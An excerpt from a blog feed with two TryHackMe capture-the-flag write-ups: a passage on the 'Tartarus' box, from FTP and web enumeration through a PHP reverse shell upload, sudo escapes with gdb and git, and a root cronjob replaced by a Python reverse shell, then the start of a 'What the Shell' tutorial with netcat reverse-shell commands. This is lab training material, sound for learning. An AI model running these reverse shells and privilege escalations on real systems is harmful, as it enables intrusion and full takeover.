&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 &lt;span class=&quot;c&quot;&gt;###&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 ftp      ftp            17 Jul 05 21:45 t##t.txt
226 Directory send OK.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;###&lt;/span&gt;
250 Directory successfully changed.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 &lt;span class=&quot;c&quot;&gt;###&lt;/span&gt;
226 Directory send OK.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;###&lt;/span&gt;
250 Directory successfully changed.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 ftp      ftp            14 Jul 05 21:45 y############s.txt 
226 Directory send OK.
ftp&amp;gt; get y############s.txt
&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: y############s.txt remote: y############s.txt
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Opening BINARY mode data connection &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;y############s.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
226 Transfer complete.
14 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.04 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.3388 kB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
ftp&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Interessting file is y############s.txt this containts a Secret Site on the Web-Server&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bat y############s.txt.txt
───────┬──────────────────────────────────────────────────────────────────────────
       │ File: y############s.txt
───────┬────────────
───────┼──────────────────────────────────────────────────────────────────────────
   1   │ /s###########t
───────┴──────────────────────────────────────────────────────────────────────────
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Web-Site is a login page. Try to Enumerate a username and a Password.&lt;/p&gt;

&lt;p&gt;Run dirsearch over the web-Server:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d💻fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/PenetrationTesting/THM/Boxes/Tartarus]
└─&lt;span class=&quot;nv&quot;&gt;$python3&lt;/span&gt; /git/dirsearch/dirsearch.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; 10.10.213.137 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; html,php      

  _|. _ _  _  _  _ _|_    v0.4.0
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_||| _&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/_&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_|| &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Extensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 7507

Error Log: /git/dirsearch/logs/errors-20-10-25_22-38-12.log

Target: http://10.10.213.137/

Output File: /git/dirsearch/reports/10.10.213.137/_20-10-25_22-38-12.txt

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:12] Starting: 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:16] 403 -  278B  - /.htaccess.bak1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:16] 403 -  278B  - /.htaccess.orig
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:16] 403 -  278B  - /.htaccess.sample
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:16] 403 -  278B  - /.htaccess.save
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:16] 403 -  278B  - /.htm
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:16] 403 -  278B  - /.html
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:16] 403 -  278B  - /.htaccessBAK
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:16] 403 -  278B  - /.htaccessOLD
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:16] 403 -  278B  - /.htaccessOLD2
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:16] 403 -  278B  - /.httr-oauth
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:17] 403 -  278B  - /.php
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:35] 200 -   11KB - /index.html
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:42] 200 -   83B  - /robots.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:42] 403 -  278B  - /server-status
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:42] 403 -  278B  - /server-status/

Task Completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;checked-robotstxt&quot;&gt;Checked Robots.txt&lt;/h2&gt;

&lt;p&gt;In the robots.txt file i find a hint for the next steps.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bat robots.txt                         
───────┬──────────────────────────────────────────────────────────────────────────
       │ File: robots.txt
───────┼──────────────────────────────────────────────────────────────────────────
   1   │ User-Agent: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
   2   │ Disallow : /a######r
   3   │ 
   4   │ I told d###h we should hide our things deep.
───────┴──────────────────────────────────────────────────────────────────────────
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the Directory there are two files, witch are interesting.&lt;/p&gt;

&lt;p&gt;c#########s.txt and u####d.&lt;/p&gt;

&lt;p&gt;I decided to go with Burb-Suite to brute force the username and password.&lt;/p&gt;

&lt;p&gt;Burp-Suite was able to find a username: “e##x” 
Now i have the username i will check the password for the username. Also with Burp-Suite. 
I tried with hydra, but hydra provided me more password witch i needed. 
The command for hydra is in the top of the writeup.&lt;/p&gt;

&lt;p&gt;Burp-Suite found the Password for user: P##########4&lt;/p&gt;

&lt;p&gt;After the login, we are on a Upload page where we can upload files to the Web-Server.&lt;/p&gt;

&lt;p&gt;Testet the Upload page with a php file, to check if i can upload a php file to the webserver.&lt;/p&gt;

&lt;p&gt;PHP files are not blocked from the upload so i can upload the php-reverse-shell.php file from PTM.&lt;/p&gt;

&lt;p&gt;The file is uploaded to the folder “/images/uploads/”&lt;/p&gt;

&lt;p&gt;When the file was uploaded, i navigate to the upload directory and startet a listener on my target. As a listener i was going with pwncat, this was my first Room where i tried Pwncat.&lt;/p&gt;

&lt;p&gt;Open the shell scirpt on the target and pwncat got a reverse conneciton.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d💻fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/PenetrationTesting/THM/Boxes/Tartarus]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pwncat &lt;span class=&quot;nt&quot;&gt;--config&lt;/span&gt; /git/pwncat/data/pwncatrc &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 9901 &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;23:10:52] error: data/pwncat: no such file or directory                 set.py:96
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;23:10:57] received connection from 10.10.213.137:55058             connect.py:255
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;23:10:57] new host w/ &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;7906cf3f08612e1f4824c25902d5d224         victim.py:321
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;23:11:01] pwncat running &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /bin/sh                                                                                                                        victim.py:354
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;23:11:02] pwncat is ready 🐈                                                                                                                               victim.py:771
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;remote&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; www-data@ubuntu-xenial:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;remote&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; www-data@ubuntu-xenial:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;acess-to-target&quot;&gt;Acess to target&lt;/h2&gt;

&lt;p&gt;When i got access to the target i always check if the user can run a command with sudo and no Password. 
When i got the shell on the Target i was the user “www-data”.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;remote&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; www-data@ubuntu-xenial:/home/thirtytwo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data on ubuntu-xenial:
    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User www-data may run the following commands on ubuntu-xenial:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;thirtytwo&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /var/www/gdb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The user www-data can run a command with the user thirtytwo. 
Now lets have a look into the gdb file witch i can run as user. 
gtfobins give me this.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;gdb &lt;span class=&quot;nt&quot;&gt;-nx&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ex&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'!sh'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ex&lt;/span&gt; quit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I try to run the command with the user thirtytwo:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; thirtytwo /var/www/gdb &lt;span class=&quot;nt&quot;&gt;-nx&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ex&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'!sh'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ex&lt;/span&gt; quit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After running this command i’m the user Thirtytwo.&lt;/p&gt;

&lt;p&gt;Check again with sudo -l i can run “git” as sudo without a password. 
Checked again GTFOBins for some Sudo commands for git.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;remote&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; thirtytwo@ubuntu-xenial:/home/thirtytwo&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;thirtytwo on ubuntu-xenial:
    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User thirtytwo may run the following commands on ubuntu-xenial:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;d4rckh&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Will try this command:&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; d4rckh /usr/bin/git &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;config
&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;/bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;now i am the user d4rckh. 
In the home directory there is the “user.flag” file
user flag: 0#############################f&lt;/p&gt;

&lt;p&gt;Now i can got for the Root user.&lt;/p&gt;

&lt;h2 id=&quot;getting-root-access&quot;&gt;Getting Root-Access&lt;/h2&gt;

&lt;p&gt;Checked the user directory and found the file cleanup.py. 
After some enumerating, i found out that the file is running every 2 minutes as a cronjob with the user root.&lt;/p&gt;

&lt;p&gt;I decided to change the file, that a reverse shell will open to my client.&lt;/p&gt;

&lt;p&gt;used this python script:&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# =*- coding: utf-8 -*-
#!/usr/bin/env python
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;10.9.170.39&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9910&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh -i&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;started a listner on my machine. Pwncat got an error when the conntection should be open. then i decided to go for a standard nc listener.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 9910
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;after 2 minutes i got a root shell and could read the root.txt file.&lt;/p&gt;

&lt;p&gt;root.txt:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;c&quot;&gt;#cat root.txt&lt;/span&gt;
7#############################d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This box was interessting. The learing was about the enumerating the user on the box and get to the root user.&lt;/p&gt;
</description>
        <pubDate>Tue, 27 Oct 2020 23:14:00 +0000</pubDate>
        <link>/blog/tartarus/</link>
        <guid isPermaLink="true">/blog/tartarus/</guid>
      </item>
    
      <item>
        <title>Writeup - THM - What the Shell</title>
        <description>&lt;h1 id=&quot;general-information&quot;&gt;General Information&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Room&lt;/th&gt;
      &lt;th&gt;Date&lt;/th&gt;
      &lt;th&gt;Difficulty&lt;/th&gt;
      &lt;th&gt;Tags&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;What the Shell&lt;/td&gt;
      &lt;td&gt;27.10.2020&lt;/td&gt;
      &lt;td&gt;Easy&lt;/td&gt;
      &lt;td&gt;Shell, netcat, socat, metasploit&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;what-is-a-shell&quot;&gt;What is a shell?&lt;/h1&gt;

&lt;p&gt;Before we can get into the intricacies of sending and receiving shells, it’s important to understand what a shell actually is. In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.&lt;/p&gt;

&lt;p&gt;In simple terms, we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port on the server which we can connect to in order to execute further commands (a bind shell).&lt;/p&gt;

&lt;p&gt;We will be covering both of these scenarios in further detail throughout the room.&lt;/p&gt;

&lt;p&gt;The format of this room is as follows:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- The bulk of the room is made up of information, with examples given in code blocks and screenshots.
- There are two VMs -- one Linux, one Windows -- in the last two tasks of the room. These can be used to practice the techniques demonstrated.
- There are example practice questions in Task 13. Feel free to work through these, or follow along with the tasks as you complete them.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Without further ado, let’s begin!&lt;/p&gt;

&lt;h1 id=&quot;tools&quot;&gt;Tools&lt;/h1&gt;

&lt;p&gt;There are a variety of tools that we will be using to receive reverse shells and to send bind shells. In general terms, we need malicious shell code, as well as a way of interfacing with the resulting shell. We will discuss each of these briefly below:&lt;/p&gt;

&lt;p&gt;Netcat:&lt;/p&gt;

&lt;p&gt;Netcat is the traditional “Swiss Army Knife” of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques that we will be covering in an upcoming task.&lt;/p&gt;

&lt;p&gt;Socat:&lt;/p&gt;

&lt;p&gt;Socat is like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;The syntax is more difficult
Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are work arounds to both of these problems, which we will cover later on.&lt;/p&gt;

&lt;p&gt;Both Socat and Netcat have .exe versions for use on Windows.&lt;/p&gt;

&lt;p&gt;Metasploit – multi/handler:&lt;/p&gt;

&lt;p&gt;The auxiliary/multi/handler module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Due to being part of the Metasploit framework, multi/handler provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It’s also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads – both of which we will look at in task 9.&lt;/p&gt;

&lt;p&gt;Msfvenom:&lt;/p&gt;

&lt;p&gt;Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Whilst msfvenom can generate payloads other than reverse and bind shells, these are what we will be focusing on in this room. Msfvenom is an incredibly powerful tool, so we will go into its application in much more detail in a dedicated task.&lt;/p&gt;

&lt;p&gt;Aside from the tools we’ve already covered, there are some repositories of shells in many different languages. One of the most prominent of these is Payloads all the Things. The PentestMonkey Reverse Shell Cheatsheet is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of webshells located at /usr/share/webshells. The SecLists repo, though primarily used for wordlists, also contains some very useful code for obtaining shells.&lt;/p&gt;

&lt;h1 id=&quot;types-of-shell&quot;&gt;Types of shell&lt;/h1&gt;

&lt;p&gt;At a high level, we are interested in two kinds of shell when it comes to exploiting a target: Reverse shells, and bind shells.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Reverse shells are when the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.
Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As a general rule, reverse shells are easier to execute and debug, however, we will cover both examples below. Don’t worry too much about the syntax here: we will be looking at it in upcoming tasks. Instead notice the difference between reverse and bind shells in the following simulations.&lt;/p&gt;

&lt;p&gt;Reverse Shell example:&lt;/p&gt;

&lt;p&gt;Let’s start with the more common reverse shell.&lt;/p&gt;

&lt;p&gt;Nine times out of ten, this is what you’ll be going for – especially in CTF challenges like those of TryHackMe.&lt;/p&gt;

&lt;p&gt;Take a look at the following image. On the left we have a reverse shell listener – this is what receives the connection. On the right is a simulation of sending a reverse shell. In reality, this is more likely to be done through code injection on a remote website or something along those lines. Picture the image on the left as being your own computer, and the image on the right as being the target.&lt;/p&gt;

&lt;p&gt;On the attacking machine:&lt;/p&gt;

&lt;p&gt;sudo nc -lvnp 443&lt;/p&gt;

&lt;p&gt;On the target:&lt;/p&gt;

&lt;p&gt;nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash&lt;/PORT&gt;&lt;/LOCAL-IP&gt;&lt;/p&gt;

